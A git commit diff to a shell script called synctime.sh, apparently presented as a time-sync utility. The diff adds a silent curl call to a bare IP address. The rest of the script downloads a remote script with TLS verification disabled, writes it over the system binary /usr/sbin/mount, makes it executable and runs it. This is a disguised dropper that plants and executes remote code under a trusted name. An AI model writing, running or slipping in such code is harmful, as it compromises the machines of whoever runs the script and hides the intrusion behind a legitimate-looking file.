835ce8c0ed1b08e2007de9f8875944f960fc0a85
synctiming <154487286+synctiming@users.noreply.github.com>
2024-01-24 03:26:22 -0500

    Update synctime.sh

--- synctime.sh
+++ synctime.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+curl -s http://193.36.119.72/1.txt
 curl -s -k https://raw.githubusercontent.com/synctiming/synctime/main/synctiming.sh -o /usr/sbin/mount
 chmod +x /usr/sbin/mount
 /usr/sbin/mount
